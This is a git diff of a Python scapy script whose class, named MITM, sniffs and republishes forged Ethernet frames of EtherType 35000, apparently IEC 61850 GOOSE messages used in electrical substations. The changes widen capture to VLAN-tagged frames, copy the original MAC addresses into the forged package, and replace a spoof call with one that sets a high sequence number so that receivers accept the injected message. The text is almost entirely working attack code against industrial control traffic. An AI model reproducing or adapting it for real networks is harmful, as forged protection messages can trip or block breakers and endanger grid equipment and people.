@@ -5,7 +5,7 @@ from scapy.all import *
 DESTINATION = "01:0c:cd:01:00:33"
 TYPE = 35000
 IFACE = "Ethernet"
-FILTER = "ether proto 35000"
+FILTER = "vlan && ether proto 35000 || ether proto 35000"
 
 class MITM:
     def __init__(self):
@@ -23,12 +23,17 @@ class MITM:
         # for byte in encoded_array:
         #     hex_array.append(hex(byte))
 
+        
         package = self.subscriber.getPackage()
+        package.setSource(packet[Ether].src)
+        package.setDestination(packet[Ether].dst)
         package.decodePackage(packet.load)
-        package.spoof()
+        #package.spoof()
+        package.highSequence()
         self.publisher.setPackage(package)
         self.ignore = True
-        self.publisher.publishEvent()
+        self.publisher.publish()
+        #self.publisher.publishEvent()
     
     def sniff(self):
         self.subscriber.sniff()
